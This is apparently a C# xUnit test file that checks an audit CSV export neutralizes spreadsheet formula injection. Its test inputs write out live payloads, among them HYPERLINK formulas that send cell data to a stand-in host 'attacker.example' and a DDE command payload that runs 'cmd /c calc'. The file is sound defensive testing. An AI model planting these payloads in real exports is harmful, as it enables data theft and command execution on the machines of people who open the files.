using Sati.Contracts.V1;
using Xunit;

namespace Sati.Tests;

/// <summary>
/// The audit export is regulatory evidence that gets opened in a spreadsheet, so
/// it must be inert. RFC 4180 quoting alone is not enough: the reader strips the
/// quotes and then evaluates a leading formula character.
/// </summary>
public sealed class AuditCsvTests
{
    [Theory]
    [InlineData("=1+1")]
    [InlineData("+1+1")]
    [InlineData("-1+1")]
    [InlineData("@SUM(A1:A9)")]
    [InlineData("=HYPERLINK(\"http://attacker.example/steal\",\"Payroll\")")]
    [InlineData("=cmd|'/c calc'!A1")]
    [InlineData("\tSUM(1)")]
    [InlineData("\r=1+1")]
    [InlineData("\n=1+1")]
    public void FormulaPayloadsAreNeutralized(string payload)
    {
        Assert.True(AuditCsv.WouldSpreadsheetEvaluate(payload));

        var field = AuditCsv.Field(payload);

        // Quoted for RFC 4180, and prefixed so the reader treats it as text.
        Assert.StartsWith("\"'", field, StringComparison.Ordinal);

        // The payload itself survives verbatim after the marker — an audit record
        // must still show what was actually stored.
        var cell = field[1..^1];
        Assert.Equal("'" + payload.Replace("\"", "\"\"", StringComparison.Ordinal), cell);
    }

    [Fact]
    public void OrdinaryValuesAreNotAltered()
    {
        Assert.Equal("\"Jane Doe\"", AuditCsv.Field("Jane Doe"));
        Assert.Equal("\"note.approved\"", AuditCsv.Field("note.approved"));
        Assert.Equal("\"\"", AuditCsv.Field(null));
        Assert.False(AuditCsv.WouldSpreadsheetEvaluate("Jane Doe"));
    }

    [Fact]
    public void EmbeddedQuotesAreStillEscaped()
    {
        Assert.Equal("\"He said \"\"stop\"\"\"", AuditCsv.Field("He said \"stop\""));
    }

    [Fact]
    public void MachineWrittenColumnsNeverTriggerNeutralization()
    {
        // Guards the assumption that lets the rule be applied uniformly: the
        // timestamp, id, and guid columns never begin with a formula character,
        // so no legitimate value picks up a stray apostrophe.
        var row = SampleRow("Jane Doe");
        var csv = AuditCsv.Build([row], "Quarterly access review", new DateTime(2026, 8, 14, 12, 0, 0, DateTimeKind.Utc));

        Assert.DoesNotContain("\"'", csv, StringComparison.Ordinal);
        Assert.Contains("\"Jane Doe\"", csv, StringComparison.Ordinal);
    }

    [Fact]
    public void ASupervisorPlantedDisplayNameCannotExecuteInTheAdminsExport()
    {
        // A Supervisor may set a supervisee's display name; only an Admin can run
        // the export. Without neutralization that crosses a privilege boundary.
        const string payload = "=HYPERLINK(\"http://attacker.example/\"&A2,\"Open\")";
        var csv = AuditCsv.Build([SampleRow(payload)], "Quarterly access review", DateTime.UtcNow);

        Assert.Contains("\"'=HYPERLINK", csv, StringComparison.Ordinal);
        Assert.DoesNotContain(",\"=HYPERLINK", csv, StringComparison.Ordinal);
    }

    [Fact]
    public void ExportReasonIsNeutralizedToo()
    {
        var csv = AuditCsv.Build([SampleRow("Jane Doe")], "=1+1", DateTime.UtcNow);

        Assert.Contains("\"'=1+1\"", csv, StringComparison.Ordinal);
    }

    [Fact]
    public void HeaderAndColumnCountStayInStep()
    {
        var csv = AuditCsv.Build([SampleRow("Jane Doe")], "Quarterly access review", DateTime.UtcNow);
        var lines = csv.Split(Environment.NewLine, StringSplitOptions.RemoveEmptyEntries);

        Assert.Equal(AuditCsv.Header, lines[0]);
        Assert.Equal(AuditCsv.Header.Split(',').Length, lines[1].Split("\",\"").Length);
    }

    private static AuditCsvRow SampleRow(string displayName) => new(
        Guid.NewGuid(),
        new DateTime(2026, 8, 14, 9, 30, 0, DateTimeKind.Utc),
        12,
        displayName,
        "note.approved",
        "Note",
        "504",
        "0HN7ABCDEF");
}
